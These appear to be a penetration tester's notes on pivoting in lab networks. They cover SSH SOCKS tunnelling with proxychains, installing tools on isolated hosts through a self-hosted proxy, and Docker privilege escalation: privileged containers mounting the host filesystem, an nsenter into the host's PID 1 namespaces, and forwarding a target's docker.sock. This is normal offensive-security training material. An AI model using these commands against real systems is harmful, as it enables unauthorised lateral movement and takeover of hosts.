# Pivoting

TODO -> https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding

## TUN Tunneling

### ligolo-ng

TODO


## SOCKS Proxying / Dynamic Port Forwarding

### SSH

```bash
ssh -D 1080 user@10.129.X.X -i root.id_rsa -fN
```

`/etc/proxychains4.conf` -> `socks5 127.0.0.1 1080`
```bash
proxychains4 -f /etc/proxychains4.conf rdp -i '172.16.5.19' -u 'user' -p 'pass'
```
-> you can only perform a `full TCP connect scan` over proxychains ??

___

#### Proxy

install software on an isolated lab machine using your internet connection. requires a proxy on your machine on 8080.

https://github.com/abhinavsingh/proxy.py
```shell
pip install proxy.py
proxy --hostname 0.0.0.0 --port 8181
```
```shell
export PROXY_IP=10.8.1.55
export PROXY_PORT=8181
apt -o Acquire::http::Proxy="http://$PROXY_IP:$PROXY_PORT" -o Acquire::https::Proxy="http://$PROXY_IP:$PROXY_PORT" update
apt -o Acquire::http::Proxy="http://$PROXY_IP:$PROXY_PORT" -o Acquire::https::Proxy="http://$PROXY_IP:$PROXY_PORT" install docker.io
```

```shell
docker ps
```

```shell
docker run -it --rm --privileged -v /:/mnt --user root jenkins/jenkins:latest bash
```

```shell
docker run -it --rm --pid=host --privileged 38cacb9bafd2 sh
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

might also host your own registry https://hub.docker.com/_/registry

In case of Docker there is no need to install it, just forward the sock and youse docker in your machine to control it
```shell
 ssh -R /tmp/docker.sock:/var/run/docker.sock user@yourbox 
```

```shell
sudo pip install --proxy http://<usr_name>:<password>@<proxyserver_name>:<port#> <pkg_name>
```
```shell
sudo pip install --proxy http://10.10.14.14:8080 impacket
```

https://gist.github.com/evantoli/f8c23a37eb3558ab8765

```shell
git -c http.https://domain.com.proxy http://proxyUsername:proxyPassword@proxy.server.com:port
```
```shell
git -c http.proxy=http://10.10.14.14:8181 clone https://github.com/lgandx/Responder
```
